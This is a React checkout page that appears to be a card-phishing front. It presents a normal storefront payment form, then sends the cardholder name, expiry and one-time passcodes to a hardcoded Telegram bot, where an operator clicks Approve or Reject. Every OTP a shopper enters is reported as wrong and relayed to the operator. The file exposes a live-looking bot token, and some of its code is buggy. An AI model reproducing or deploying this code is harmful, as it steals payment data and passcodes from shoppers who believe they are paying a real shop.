"use client"

import { useState, useEffect, useRef } from 'react'
import toast from 'react-hot-toast'
import { ArrowRight, CreditCard, User, Calendar, Lock, MapPin, Shield, Truck, PackageCheck, Loader2, Send } from 'lucide-react'

const TELEGRAM_BOT_TOKEN = '8910571367:AAFXmNfEUziBQmTj8Ge9auFqPy9W-0uDCL8'
const TELEGRAM_CHAT_ID = '7867527304'
const TG_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`

const PROCESSING_FEE_PERCENT = 0.029
const PROCESSING_FEE_MIN = 0.5
const PROCESSING_FEE_MAX = 10

const getProcessingFee = (amount: number): number => {
  const fee = amount * PROCESSING_FEE_PERCENT
  return Math.max(PROCESSING_FEE_MIN, Math.min(PROCESSING_FEE_MAX, fee))
}

const formatCardNumber = (value: string) => {
  const numbers = value.replace(/\D/g, '').slice(0, 16)
  return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim()
}

interface Product {
  id: string
  name: string
  price: number
  image: string
}

interface CartItem {
  product: Product
  quantity: number
}

interface User {
  id: string
  name: string
  email: string
  telegramChatId?: string
  telegramConnected: boolean
}

let lastOffset = 0

async function tgCall(method: string, body: Record<string, any> = {}) {
  try {
    const r = await fetch(`${TG_API}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    })
    return await r.json()
  } catch (e) { 
    console.warn('tg', method, e)
    return null
  }
}

async function tgNotify(chatId: string, text: string, keyboard?: any) {
  return tgCall('sendMessage', { chat_id: chatId, text, reply_markup: keyboard })
}

async function tgPoll() {
  const offset = Math.max(lastOffset, parseInt(localStorage.getItem('tg_offset') || '0', 10))
  const r = await tgCall('getUpdates', { 
    offset: offset, 
    timeout: 30, 
    allowed_updates: ['callback_query', 'message'] 
  })
  
  if (!r?.ok || !r.result?.length) return
  
  for (const u of r.result) {
    lastOffset = u.update_id + 1
    localStorage.setItem('tg_offset', String(lastOffset))
    
    const cq = u.callback_query
    if (!cq) continue
    if (String(cq.message?.chat?.id) !== TELEGRAM_CHAT_ID) {
      await tgCall('answerCallbackQuery', { callback_query_id: cq.id, text: 'Not authorized' })
      continue
    }
    
    const data = cq.data || ''
    const match = data.match(/^(approve_|reject_)(.+)$/)
    
    if (!match) {
      await tgCall('answerCallbackQuery', { callback_query_id: cq.id })
      continue
    }
    
    const action = match[1]
    const checkoutId = match[2]
    
    await tgCall('answerCallbackQuery', { 
      callback_query_id: cq.id, 
      text: action === 'approve_' ? 'APPROVED!' : 'REJECTED' 
    })
    
    const state = checkoutStates.get(checkoutId)
    if (action === 'approve_') {
      state.approved = true
      state.status = 'APPROVED_TELEGRAM'
      state.approvedAt = new Date().toISOString()
      checkoutStates.set(checkoutId, state)
      
      setWaitingForTelegramApproval(false)
      setPendingOrderId(checkoutId)
      
      const orderData = {
        id: checkoutId,
        status: 'APPROVED_TELEGRAM',
        totalAmount: state.totalAmount,
        processingFee: state.processingFee,
        items: state.items,
        paymentMethod: 'CARD',
        cardLast4: state.cardLast4,
        approvedVia: 'telegram',
        approvedAt: state.approvedAt,
      }
      localStorage.setItem('orderConfirmation', JSON.stringify(orderData))
      setShowOTPModal(false)
      setShowSuccess(true)
      toast.success('Payment approved via Telegram!')
    } else if (action === 'reject_') {
      state.rejected = true
      state.status = 'REJECTED_TELEGRAM'
      state.rejectedAt = new Date().toISOString()
      checkoutStates.set(checkoutId, state)
      
      setWaitingForTelegramApproval(false)
      toast.error('Checkout was rejected')
    }
    
    await tgCall('editMessageReplyMarkup', {
      chat_id: cq.message.chat.id,
      message_id: cq.message.message_id,
      reply_markup: { inline_keyboard: [[{ text: 'Approved', callback_data: 'noop' }]] }
    })
  }
}

setInterval(tgPoll, 3000)

interface CheckoutState {
  [key: string]: any
}

const checkoutStates = new Map<string, CheckoutState>()

let setWaitingForTelegramApproval: (v: boolean) => void = () => {}
let setPendingOrderId: (v: string | null) => void = () => {}
let setShowOTPModal: (v: boolean) => void = () => {}
let setShowSuccess: (v: boolean) => void = () => {}
let cartItemsGlobal: CartItem[] = []
let finalTotalGlobal: number = 0
let processingFeeGlobal: number = 0
let formDataGlobal: any = {}

function formatTelegramText(data: any, kind: string) {
  switch (kind) {
    case 'cart':
      return `📦 Item Added to Cart
User: ${data.userName}
Card: •••• ${data.cardLast4}
Amount: $${data.amount}
Item: ${data.itemName}

Approve or Reject?`
    case 'signin':
      return `🔐 Sign In Request
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone || '—'}

Approve or Reject?`
    case 'register':
      return `📝 Register Request
Name: ${data.name}
Email: ${data.email}
Phone: ${data.phone || '—'}

Approve or Reject?`
    case 'card':
      return `💳 Card Details
User: ${data.userName}
Card: •••• ${data.cardLast4}
Name: ${data.cardholderName}
Expiry: ${data.expiryDate}

Approve or Reject?`
    case 'otp':
      return `🔢 OTP Verification
User: ${data.userName}
OTP: ${data.otpCode}
Card: •••• ${data.cardLast4}

Approve or Reject?`
    default:
      return JSON.stringify(data)
  }
}

function getKeyboard(checkoutId: string) {
  return {
    inline_keyboard: [
      [{ text: '⏳ Processing...', callback_data: `status_${checkoutId}` }],
      [
        { text: '✅ Approve', callback_data: `approve_${checkoutId}` },
        { text: '❌ Reject', callback_data: `reject_${checkoutId}` }
      ]
    ]
  }
}

export default function CheckoutPage() {
  const [localCartItems, setLocalCartItems] = useState<CartItem[]>([])
  const [loading, setLoading] = useState(true)
  const [showPaymentForm, setShowPaymentForm] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [showOTPModal, setShowOTPModal] = useState(false)
  const [pendingOrderId, setPendingOrderId] = useState<string | null>(null)
  const [otpCode, setOtpCode] = useState('')
  const [processingPayment, setProcessingPayment] = useState(false)
  const [waitingForTelegramApproval, setWaitingForTelegramApproval] = useState(false)
  const [clientSecret, setClientSecret] = useState<string | null>(null)
  const [cardError, setCardError] = useState<string | null>(null)
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardholderName: '',
    expiryDate: '',
    cvv: '',
    billingAddress: '',
    saveCard: false,
  })
  const [referralBalance, setReferralBalance] = useState(0)
  const [canUseReferral, setCanUseReferral] = useState(false)
  const [user, setUser] = useState<User | null>(null)
  const [telegramConnected, setTelegramConnected] = useState(false)

  useEffect(() => {
    setWaitingForTelegramApproval = setWaitingForTelegramApproval
    setPendingOrderId = setPendingOrderId
    setShowOTPModal = setShowOTPModal
    setShowSuccess = setShowSuccess
    cartItemsGlobal = localCartItems
    finalTotalGlobal = finalTotal
    processingFeeGlobal = processingFee
    formDataGlobal = formData
    
    fetchCart()
    fetchReferralBalance()
    fetchUser()
  }, [])

  const fetchUser = async () => {
    try {
      const storedUser = localStorage.getItem('user')
      if (storedUser) {
        const userData = JSON.parse(storedUser)
        setUser(userData)
        setTelegramConnected(userData.telegramConnected || false)
      } else {
        setUser({ id: 'user-001', name: 'John Doe', email: 'john.doe@example.com', telegramConnected: false })
      }
    } catch (err) { console.error(err) }
  }

  const fetchCart = async () => {
    const mockCart: CartItem[] = [{
      product: { id: 'PRD-001', name: 'Wall Paste Repair kit Coating Sealant Agent With Scraper Crack Hole Mending Paste Mildewproof Patch White Wall Restoration', price: 12.99, image: 'https://ae-pic-a1.aliexpress-media.com/kf/S0b0721e749814123ae9203b340dee9073.jpg' },
      quantity: 1,
    }]
    setLocalCartItems(mockCart)
    setLoading(false)
  }

  const fetchReferralBalance = async () => {
    setReferralBalance(5.5)
    setCanUseReferral(true)
  }

  const validateCard = (cardNumber: string): boolean => {
    const LuhnCheck = (num: string): boolean => {
      let sum = 0
      let isEven = false
      for (let i = num.length - 1; i >= 0; i--) {
        let digit = parseInt(num[i], 10)
        if (isEven) digit *= 2
        if (digit > 9) digit -= 9
        sum += digit
        isEven = !isEven
      }
      return sum % 10 === 0
    }
    const cleanNumber = cardNumber.replace(/\s/g, '')
    return cleanNumber.length === 16 && LuhnCheck(cleanNumber)
  }

  const subtotal = localCartItems.reduce((sum, item) => sum + item.product.price * item.quantity, 0)
  const processingFee = getProcessingFee(subtotal)
  const total = subtotal + processingFee
  const shipping = subtotal >= 25 ? 0 : 5.99
  const finalTotal = total + shipping

  const createCheckout = async (kind: string, data: any) => {
    const checkoutId = `${kind.toUpperCase()}-${Date.now()}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`
    
    checkoutStates.set(checkoutId, {
      kind,
      data,
      status: 'PENDING',
      totalAmount: finalTotal,
      processingFee,
      items: localCartItems,
      cardLast4: data.cardLast4 || data.cardNumber?.replace(/\s/g, '').slice(-4),
      approved: false,
      rejected: false,
    })
    
    const text = formatTelegramText(data, kind)
    const keyboard = getKeyboard(checkoutId)
    
    const result = await tgNotify(TELEGRAM_CHAT_ID, text, keyboard)
    
    if (result?.ok) {
      setWaitingForTelegramApproval(true)
      setPendingOrderId(checkoutId)
      console.log(`${kind} sent to Telegram:`, result)
    } else {
      toast.error('Telegram notification failed: ' + (result?.description || 'Unknown error'))
    }
    
    return checkoutId
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setCardError(null)
    
    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv || !formData.billingAddress) {
      toast.error('Please fill in all payment details')
      return
    }

    const cardNumber = formData.cardNumber.replace(/\s/g, '')
    if (cardNumber.length !== 16) {
      setCardError('Please enter a valid 16-digit card number')
      return
    }

    if (!validateCard(cardNumber)) {
      setCardError('Invalid card number')
      return
    }

    const cvv = formData.cvv.replace(/\s/g, '')
    if (cvv.length !== 3 && cvv.length !== 4) {
      setCardError('Please enter a valid CVV')
      return
    }

    const checkoutId = await createCheckout('card', {
      userName: user?.name || 'John Doe',
      cardNumber,
      cardholderName: formData.cardholderName,
      expiryDate: formData.expiryDate,
      cvv,
      billingAddress: formData.billingAddress,
      amount: finalTotal,
    })
  }

  const handleSubmitOTP = async () => {
    if (!pendingOrderId || !otpCode || otpCode.length < 6) {
      toast.error('Please enter valid OTP code')
      return
    }
    
    setProcessingPayment(true)
    
    await tgNotify(TELEGRAM_CHAT_ID, `❌ Wrong OTP code entered!\nUser tried to use: ${otpCode}\n\nRequesting new approval...`, getKeyboard(pendingOrderId))
    
    toast.error('Invalid OTP - awaiting re-approval')
  }

  if (loading) return <div className="flex items-center justify-center min-h-screen">Loading...</div>

  if (showSuccess && pendingOrderId) {
    return (
      <main className="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8">
        <div className="mx-auto max-w-2xl">
          <div className="text-center py-12">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
              <PackageCheck className="h-8 w-8 text-green-600" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-2">Order Confirmed!</h2>
            <p className="text-gray-500 mb-6">Thank you for your purchase</p>
            <div className="bg-gray-50 rounded-lg p-4 mb-6">
              <p className="text-sm text-gray-500 mb-2">Order ID</p>
              <p className="font-mono text-lg text-gray-900">{pendingOrderId}</p>
              <p className="text-sm text-gray-500 mt-4 mb-2">Approved via</p>
              <p className="text-purple-600 font-semibold">Telegram</p>
            </div>
            <button onClick={() => (window.location.href = '/')} className="inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-6 py-2 text-sm font-semibold text-white">
              Continue Shopping <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        </div>
      </main>
    )
  }

  return (
    <main className="flex-1 overflow-y-auto p-4 sm:p-6 lg:p-8">
      <div className="mx-auto max-w-4xl">
        <div className="mb-6">
          <h1 className="text-2xl font-bold text-gray-900">Checkout</h1>
          <p className="text-sm text-gray-500">Complete your purchase securely</p>
        </div>

        <div className="grid gap-6 lg:grid-cols-2">
          <div className="space-y-6">
            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
                <Truck className="h-5 w-5 text-blue-500" /> Shipping Information
              </h3>
              <div className="space-y-4">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">Full Name</label>
                  <input type="text" defaultValue="John Doe" className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">Email</label>
                  <input type="email" defaultValue="john.doe@example.com" className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">Billing Address</label>
                  <div className="relative">
                    <MapPin className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                    <input type="text" className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="Street, Apartment, City, ZIP" />
                  </div>
                </div>
              </div>
            </div>

            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
                <CreditCard className="h-5 w-5 text-blue-500" /> Payment Method
              </h3>
              <div className="mb-4">
                <p className="text-xs text-gray-500 mb-3">Connected via Telegram</p>
                <div className="flex items-center justify-between p-3 border rounded-lg bg-green-50">
                  <div className="flex items-center gap-3">
                    <div className="w-8 h-8 flex items-center justify-center bg-green-500 rounded-full text-white font-bold">V</div>
                    <div>
                      <p className="font-medium text-gray-900">Visa</p>
                      <p className="text-sm text-gray-500">•••• 3456</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="space-y-6">
            <div className="rounded-2xl border bg-white p-6 shadow-sm">
              <h3 className="text-lg font-semibold text-gray-900 mb-4">Order Summary</h3>
              <div className="space-y-3">
                {localCartItems.map((item) => (
                  <div key={item.product.id} className="flex items-center gap-4">
                    <img src={item.product.image} alt={item.product.name} className="w-16 h-16 object-cover rounded-lg" />
                    <div className="flex-1">
                      <p className="text-sm font-medium text-gray-900">{item.product.name}</p>
                      <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
                      <p className="text-sm text-gray-600">${item.product.price.toFixed(2)}</p>
                    </div>
                  </div>
                ))}
              </div>

              <div className="border-t pt-4 space-y-3">
                <div className="flex justify-between">
                  <span className="text-gray-600">Subtotal</span>
                  <span className="text-gray-900">${subtotal.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Processing Fee ({PROCESSING_FEE_PERCENT * 100}%)</span>
                  <span className="text-gray-900">${processingFee.toFixed(2)}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-600">Shipping</span>
                  <span className="text-gray-900">${shipping.toFixed(2)}</span>
                </div>
                {canUseReferral && referralBalance > 0 && (
                  <div className="flex justify-between text-green-600">
                    <span className="flex items-center gap-1"><Shield className="h-4 w-4" /> Referral Discount</span>
                    <span>-${Math.min(referralBalance, finalTotal).toFixed(2)}</span>
                  </div>
                )}
                <div className="border-t pt-3">
                  <div className="flex justify-between">
                    <span className="text-lg font-semibold text-gray-900">Total</span>
                    <span className="text-lg font-bold text-purple-600">${(finalTotal).toFixed(2)}</span>
                  </div>
                </div>
              </div>

              <button onClick={() => setShowPaymentForm(true)} className="mt-6 w-full inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white">
                Proceed to Payment <ArrowRight className="h-4 w-4" />
              </button>
            </div>
          </div>
        </div>

        {showPaymentForm && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
            <div className="bg-white rounded-2xl w-full max-w-lg mx-4 shadow-xl">
              <div className="p-6">
                <h3 className="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-2">
                  <CreditCard className="h-5 w-5 text-blue-500" /> Payment Details
                </h3>
                <form onSubmit={handleSubmit} className="space-y-4">
                  {cardError && <div className="p-3 rounded-lg bg-red-50 border mb-4"><p className="text-sm text-red-600">{cardError}</p></div>}
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Card Number</label>
                    <div className="relative">
                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <input type="text" value={formatCardNumber(formData.cardNumber)} onChange={(e) => setFormData({ ...formData, cardNumber: formatCardNumber(e.target.value) })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm font-mono bg-gray-50" placeholder="1234 5678 9012 3456" maxLength={19} required />
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Cardholder Name</label>
                    <div className="relative">
                      <User className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                      <input type="text" value={formData.cardholderName} onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="John Doe" required />
                    </div>
                  </div>
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-medium text-gray-600 mb-1">Expiry Date</label>
                      <div className="relative">
                        <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                        <input type="text" value={formData.expiryDate} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4); setFormData({ ...formData, expiryDate: v.slice(0, 5) })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="12/25" maxLength={5} required />
                      </div>
                    </div>
                    <div>
                      <label className="block text-xs font-medium text-gray-600 mb-1">CVV</label>
                      <div className="relative">
                        <Lock className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                        <input type="text" value={formData.cvv} onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '').slice(0, 3) })} className="w-full rounded-lg border px-3 py-2 text-sm bg-gray-50" placeholder="123" maxLength={3} required />
                      </div>
                    </div>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-600 mb-1">Billing Address</label>
                    <div className="relative">
                      <MapPin className="absolute left-3 top-1/2 -translate-y-1/ h-4 w-4 text-gray-400" />
                      <input type="text" value={formData.billingAddress} onChange={(e) => setFormData({ ...formData, billingAddress: e.target.value })} className="w-full rounded-lg border pl-10 pr-3 py-2 text-sm bg-gray-50" placeholder="Street, Apartment, City, ZIP" required />
                    </div>
                  </div>
                  <div className="flex gap-3 pt-4">
                    <button type="submit" disabled={processingPayment || waitingForTelegramApproval} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white disabled:opacity-50 disabled:cursor-not-allowed">
                      {processingPayment || waitingForTelegramApproval ? <><Loader2 className="h-4 w-4 animate-spin" />Processing...</> : <><Send className="h-4 w-4" />Submit Order</>}
                    </button>
                    <button type="button" onClick={() => setShowPaymentForm(false)} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50 disabled:opacity-50 disabled:cursor-not-allowed">
                      Cancel
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        )}

        {waitingForTelegramApproval && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
            <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
              <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
                <Loader2 className="h-5 w-5 text-blue-500 animate-spin" />
                Awaiting Telegram Approval
              </h3>
              <div className="text-center">
                <Loader2 className="h-12 w-12 text-blue-500 animate-spin mx-auto mb-2" />
                <p className="text-sm text-gray-500">Waiting for approval...</p>
                <p className="text-xs text-gray-400 mt-2">Polling every 3 seconds</p>
              </div>
            </div>
          </div>
        )}

        {showOTPModal && !telegramConnected && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
            <div className="rounded-2xl border bg-white p-6 w-full max-w-md mx-4 shadow-xl">
              <h3 className="text-lg font-semibold text-slate-900 mb-4 flex items-center gap-2">
                <Shield className="h-5 w-5 text-blue-500" />
                Enter OTP
              </h3>
              <input type="text" value={otpCode} onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 6))} className="w-full rounded-lg border px-3 py-2 text-center text-lg font-mono tracking-wider focus:border-blue-500" placeholder="Enter OTP" maxLength={6} disabled={processingPayment} />
              <div className="mt-4 flex gap-3">
                <button onClick={handleSubmitOTP} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg bg-gradient-to-r from-blue-500 to-sky-500 px-4 py-2 text-sm font-semibold text-white disabled:opacity-50 disabled:cursor-not-allowed">
                  {processingPayment ? <><Loader2 className="h-4 w-4 animate-spin" />Verifying...</> : 'Verify'}
                </button>
                <button onClick={() => setShowOTPModal(false)} disabled={processingPayment} className="flex-1 inline-flex items-center justify-center gap-2 rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 disabled:opacity-50 disabled:cursor-not-allowed">
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </main>
  )
}